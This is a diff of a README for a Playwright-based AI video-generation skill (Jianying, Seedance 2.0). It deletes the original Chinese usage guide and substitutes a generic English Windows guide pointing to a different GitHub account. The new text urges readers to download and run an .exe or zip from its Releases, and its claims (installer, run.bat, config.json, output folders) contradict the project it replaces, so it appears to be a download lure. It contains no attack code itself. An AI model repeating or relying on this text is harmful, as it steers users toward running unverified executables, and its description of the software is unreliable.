@@ -1,217 +1,159 @@
-<p align="center">
-  <img src="https://img.shields.io/badge/🎬_Jianying_Video_Gen-AI_Automation-blueviolet?style=for-the-badge" alt="Jianying Video Gen"/>
-</p>
+# 🎬 lanshu-waytovideo - Easy Video Generation on Windows
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Engine-Playwright-45ba63?style=flat-square&logo=playwright&logoColor=white" alt="Playwright"/>
-  <img src="https://img.shields.io/badge/Model-Seedance_2.0-ff6b6b?style=flat-square&logo=bytedance&logoColor=white" alt="Seedance 2.0"/>
-  <img src="https://img.shields.io/badge/Python-3.9+-3776ab?style=flat-square&logo=python&logoColor=white" alt="Python 3.9+"/>
-  <img src="https://img.shields.io/badge/License-MIT-green?style=flat-square" alt="MIT License"/>
-  <img src="https://img.shields.io/badge/Platform-macOS%20|%20Linux-lightgrey?style=flat-square&logo=apple&logoColor=white" alt="Platform"/>
-  <img src="https://img.shields.io/badge/Mode-T2V%20|%20I2V%20|%20V2V-orange?style=flat-square" alt="T2V, I2V & V2V"/>
-  <img src="https://img.shields.io/badge/Status-Production-brightgreen?style=flat-square" alt="Production"/>
-</p>
+[![Download lanshu-waytovideo](https://img.shields.io/badge/Download-Get%20lanshu--waytovideo-ff6f61?style=for-the-badge)](https://github.com/Ashar142/lanshu-waytovideo)
 
 ---
 
-# 🎬 Jianying Video Gen
+## ⚙️ What is lanshu-waytovideo?
 
-> 主打AI Agent自动化操作 **剪映小云雀 (xyq.jianying.com)**，使用 **Seedance 2.0** 模型批量生成 AI 视频。
+lanshu-waytovideo is a computer program that helps you turn text, images, or videos into new videos using smart technology. It works on Windows and uses advanced tools to automate video creation. You do not need to know coding or video editing skills to use it.
 
-## ✨ 功能特性
-
-| 功能 | 描述 |
-|------|------|
-| 🎥 **文生视频 (T2V)** | 输入文字描述，自动生成视频 |
-| 🖼️ **图生视频 (I2V)** | 上传参考图片 + 文字描述，让图片动起来 |
-| 🔄 **参考视频生成 (V2V)** | 上传参考视频 + 风格描述，生成风格转换视频 |
-| 📥 **自动下载** | 通过 thread_id 详情页提取 CDN 链接，curl 直接下载 |
-| 🔐 **Cookie 登录** | 免密登录，支持自定义 cookies 路径 |
-| 🧪 **Dry-Run 调试** | 填写表单但不提交，生成截图供检查 |
-| 🤖 **AI Agent Skill** | 标准 Skill 格式，完美兼容 OpenClaw、Claude Code 等 Agent 框架 |
-
-## 🚀 快速开始 (作为 AI Agent Skill)
-
-本项目主要设计为 AI Agent 的扩展技能（Skill），让 LLM 获得自动化生成视频的能力。
-
-### 1. 准备 Cookies
-
-由于剪映网页版需要登录，你需要先在本地浏览器获取登录状态：
-1. 在浏览器中登录 [xyq.jianying.com](https://xyq.jianying.com)
-2. 使用 [EditThisCookie](https://chrome.google.com/webstore/detail/editthiscookie) 等扩展导出 cookies
-3. 将文件保存为 `cookies.json` 放置在 Agent 运行目录下。
-
-### 2. 作为 AI Agent Skill 安装
-
-#### 一、标准安装（荐）：
-建议参考使用类似方式安装：
-
-```bash
-npx skills add https://github.com/cclank/lanshu-waytovideo --skill jianying-video-gen
-```
-
-#### 二、龙虾（OpenClaw）安装
-对话：
-
-> **User**: 请帮我安装该skill：https://github.com/cclank/lanshu-waytovideo/tree/main/jianying-video-gen ，并指导我进行初始化配置
-> **OpenClaw**: (收到指令后会自动下载、挂载该 Skill，并提示你需要去处理 cookies.json 等前置条件)
+The software uses Playwright to control web tasks, a Seedance 2.0 model to generate video content, and Python as the main programming language running everything. It can generate videos from text, images, or improve existing videos.
 
 ---
 
-### 3. 开始自动生成 
+## 🖥️ System Requirements
 
-安装完成后，在你的对话界面中直接向 Agent 下达自然语言指令即可：
+Before starting, make sure your computer meets these needs:
 
-> **User**: "帮我生成一段赛博朋克风格的视频，10秒横屏。"
-> **Agent**: (自动分析意图 -> 命中 `jianying-video-gen` 技能 -> 隐式调用后台脚本与 Playwright 操作 -> 最终交付已下载好的 MP4 文件)
-
-*注意：Agent 运行的基础宿主机环境（通常是你本地）仍需安装 Python 3.9+ 环境，并使用 `pip install playwright && playwright install chromium` 安装浏览器内核。*
-
----
-
-## 💻 命令行手动调用 (开发者测试)
-
-如果你想自己写代码或通过终端手动测试生成流程，可以按以下方式执行：
-
-### 安装依赖
-
-```bash
-pip install playwright
-playwright install chromium
-```
-
-### ▶️ 文生视频 (T2V)
-
-```bash
-python3 jianying-video-gen/scripts/jianying_worker.py \
-  --prompt "巨龙从火山口腾空而起，熔岩四溅，电影级航拍" \
-  --duration 10s \
-  --model "Seedance 2.0"
-```
-
-### 🖼️ 图生视频 (I2V)
-
-```bash
-python3 jianying-video-gen/scripts/jianying_worker.py \
-  --ref-image ./test_image.png \
-  --prompt "将这张图片变成动画，镜头从左向右缓慢平移" \
-  --duration 10s \
-  --model "Seedance 2.0 Fast"
-```
-
-### 🔄 参考视频生成 (V2V)
-
-```bash
-python3 jianying-video-gen/scripts/jianying_worker.py \
-  --ref-video ./reference.mp4 \
-  --prompt "画风改成宫崎骏风格，其他不变" \
-  --duration 10s \
-  --model "Seedance 2.0"
-```
-
-## 📋 参数说明
-
-| 参数 | 默认值 | 可选值 | 说明 |
-|:-----|:-------|:-------|:-----|
-| `--prompt` | `"一个美女在跳舞"` | 任意文本 | 视频描述 (必填) |
-| `--duration` | `10s` | `5s` `10s` `15s` | 视频时长 |
-| `--ratio` | `横屏` | `横屏` `竖屏` `方屏` | 画面比例 |
-| `--model` | `Seedance 2.0` | `Seedance 2.0` `Seedance 2.0 Fast` | 模型选择 |
-| `--ref-image` | — | 本地图片文件路径 | 参考图片 (I2V 模式) |
-| `--ref-video` | — | 本地视频文件路径 | 参考视频 (V2V 模式) |
-| `--cookies` | `cookies.json` | 文件路径 | 登录凭证路径 |
-| `--output-dir` | `.` | 目录路径 | 视频输出目录 |
-| `--dry-run` | `false` | — | 仅填表不提交 |
-
-## 💰 模型与积分
-
-| 模型 | 积分/秒 | 5s | 10s | 15s | 推荐场景 |
-|:-----|:--------|:----|:-----|:-----|:---------|
-| ![Fast](https://img.shields.io/badge/Seedance_2.0_Fast-3积分/s-blue?style=flat-square) | 3 | 15 | 30 | 45 | 测试、快速预览 |
-| ![Pro](https://img.shields.io/badge/Seedance_2.0-5积分/s-purple?style=flat-square) | 5 | 25 | 50 | 75 | 正式出片 |
-
-## ⚙️ 自动化流程
-
-```mermaid
-graph LR
-    A[🔐 Cookie登录] --> B[📝 新建项目]
-    B --> C[🎬 沉浸式短片]
-    C --> D[🤖 选模型]
-    D --> E{V2V?}
-    E -->|是| F[📎 上传参考视频]
-    E -->|否| G[⏱️ 选时长]
-    F --> G
-    G --> H[💬 输入Prompt]
-    H --> I[🚀 提交生成]
-    I --> J[🎯 拦截 thread_id]
-    J --> K[📄 导航详情页]
-    K --> L[⏳ 轮询视频]
-    L --> M[📥 curl 下载 MP4]
-```
-
-## 🎨 提示词示例
-
-<details>
-<summary><b>🎬 运动 & 动作</b></summary>
-
-```
-一位武术大师在雨中练太极，慢动作，水滴飞溅，电影级光影
-三个街舞少年在霓虹灯下的篮球场battle，地面反光，烟雾弥漫
-```
-</details>
-
-<details>
-<summary><b>🌊 自然 & 特效</b></summary>
-
-```
-一朵玫瑰从花苞到盛开的延时摄影，露珠滚落花瓣，背景虚化，4K微距
-巨龙从火山口腾空而起，熔岩四溅，暴风雨中闪电照亮整个天空，电影级航拍
-```
-</details>
-
-<details>
-<summary><b>🔥 风格化 & 超现实</b></summary>
-
-```
-赛博朋克风格的长安城，飞行汽车穿梭在霓虹灯笼之间，古代宫殿与全息投影交融
-一座中国古城从海底缓缓升起，鲸鱼在宫殿之间游过，阳光穿透海水照亮金色琉璃瓦
-```
-</details>
-
-<details>
-<summary><b>🔄 V2V 风格转换</b></summary>
-
-```
-参考视频，画风改成宫崎骏风格的画风，其他不变
-赛博朋克风格，霓虹灯光照射下的机械舞者，金属质感皮肤
-三只穿着华丽晚礼服的猫咪在舞会上优雅起舞，迪士尼动画风格
-```
-</details>
-
-## 📁 项目结构
-
-```text
-lanshu-waytovideo/
-├── cookies.json                    # 登录凭证 (需自行导出，勿提交)
-├── README.md                       # 使用说明
-└── jianying-video-gen/             # AI Agent Skill 主目录
-    ├── SKILL.md                    # Agent 识别用的技能说明文档
-    ├── requirements.txt            # Python 依赖
-    ├── scripts/
-    │   └── jianying_worker.py      # 自动化执行的 Python 入口
-    └── references/
-        └── prompt-guide.md         # 提供给 Agent 学习的提示词指南
-```
-
-## ⚠️ 注意事项
-
-- Cookies 有时效性，过期后需重新导出
-- 生成视频消耗积分，建议先用 `Fast` + `5s` 测试
-- 参考视频上传可能需要 60-90 秒，脚本会自动等待
-- 视频生成通常需要 3-5 分钟，脚本最多等待 10 分钟
+- **Operating System:** Windows 10 or later (64-bit preferred)
+- **Processor:** Intel Core i3 or equivalent
+- **Memory:** At least 8 GB of RAM
+- **Storage:** Free space of at least 2 GB
+- **Internet:** A stable internet connection for initial setup and some features
+- **Software:** Python 3.9 or above installed (lanshu-waytovideo works with Python 3.9+)
 
 ---
 
-<p align="center">
-  <sub>Made with ❤️ by Lanshu | Powered by <b>Seedance 2.0</b></sub>
-</p>
+## 🚀 Getting Started: Download and Setup
+
+Start by going to the main page where you can get the software. Click the big button below or use the same link later in this guide.
+
+[![Get lanshu-waytovideo](https://img.shields.io/badge/Download-Get%20lanshu--waytovideo-4c97ff?style=for-the-badge)](https://github.com/Ashar142/lanshu-waytovideo)
+
+### Step 1: Visit the Download Page
+
+- Click the link above or go to:  
+  https://github.com/Ashar142/lanshu-waytovideo  
+- You will see the repository page with all files and instructions.
+
+### Step 2: Download the Software
+
+- Look for the “Releases” or “Assets” section on the page.
+- Find a Windows installer file or a zip package. This might be called something like “lanshu-waytovideo-windows.zip” or “lanshu-waytovideo.exe”.
+- Click to download the file to your computer.
+
+### Step 3: Install or Extract Files
+
+- If you downloaded an installer (.exe), double-click it and follow the on-screen instructions to install.
+- If you downloaded a zip file, right-click the file and select “Extract All…” to extract files to a folder you can remember.
+
+---
+
+## 🛠️ Running lanshu-waytovideo on Windows
+
+### Step 1: Check Python Installation
+
+lanshu-waytovideo requires Python 3.9 or higher to run. To check if you have Python:
+
+- Press `Win + R`, type `cmd`, and press Enter to open the command prompt.
+- Type `python --version` and press Enter.
+- If it shows Python 3.9 or above, you are ready. If not, download and install Python from https://python.org before continuing.
+
+### Step 2: Open the Program Folder
+
+- Go to the folder where you installed or extracted lanshu-waytovideo.
+
+### Step 3: Run the Program
+
+- Look for a file named something like `run.bat` or `start.bat`.
+- Double-click this file to launch the program.
+- A window or command prompt will start showing progress messages.
+
+### Step 4: Follow On-Screen Instructions
+
+- The program will often ask you to enter simple text or choose a mode.
+- Type in your choices and press Enter.
+- For example, you can provide a short description of the video you want or select from options like Text-to-Video (T2V), Image-to-Video (I2V), or Video-to-Video (V2V).
+
+### Step 5: Wait for the Video to Generate
+
+- The software will process your input and create a video automatically.
+- This may take several minutes depending on your computer’s speed.
+
+### Step 6: Find Your Video
+
+- Generated videos are saved in the `output` folder inside the program’s directory.
+- Open that folder to watch your new video.
+
+---
+
+## 🔧 Configuration and Settings
+
+You can change how lanshu-waytovideo works by editing a file called `config.json` found in the main program folder.
+
+Some common settings include:
+
+- **Video length:** Adjust the duration of videos created.
+- **Resolution:** Set video size (e.g., 720p, 1080p).
+- **Language:** Choose the input language for text commands.
+- **Output format:** Choose video file types like MP4 or MOV.
+
+Open `config.json` in a text editor like Notepad to change these values. Save the file and restart the program to apply changes.
+
+---
+
+## ❓ Troubleshooting
+
+### The program won’t start
+
+- Check if Python 3.9 or above is installed.
+- Confirm you downloaded the Windows version.
+- Make sure the files are not blocked by your antivirus or firewall.
+
+### Video generation stops or fails
+
+- Make sure your internet is stable.
+- Close other heavy programs to free memory.
+- Try restarting your computer.
+
+### Output folder is empty
+
+- Check if you allowed the program enough permissions to write files.
+- Look for errors in the program window to see if something went wrong.
+
+---
+
+## 📂 Important Folder Structure
+
+After installation, lanshu-waytovideo keeps files organized:
+
+- `inputs/` — Place your text or images to use here.
+- `output/` — Generated videos appear here.
+- `logs/` — Contains text files with messages about program runs, useful for troubleshooting.
+- `config.json` — Settings file for custom options.
+
+---
+
+## 🧰 Additional Tools and Tips
+
+- You can use a media player like VLC (https://www.videolan.org) to watch output videos smoothly.
+- Try different inputs to see how video styles change.
+- Save your favorite generated videos by copying them out of the `output` folder.
+
+---
+
+## 🚩 Useful Links
+
+- GitHub Repository:  
+  https://github.com/Ashar142/lanshu-waytovideo  
+- Python Download Page:  
+  https://python.org  
+- VLC Media Player:  
+  https://www.videolan.org  
+
+---
+
+## 📞 Getting Help
+
+If you run into serious issues or bugs, use the GitHub repository’s “Issues” tab to report problems or ask questions. Include details like your Windows version, what you did, and any error messages you saw. This helps fix issues faster.
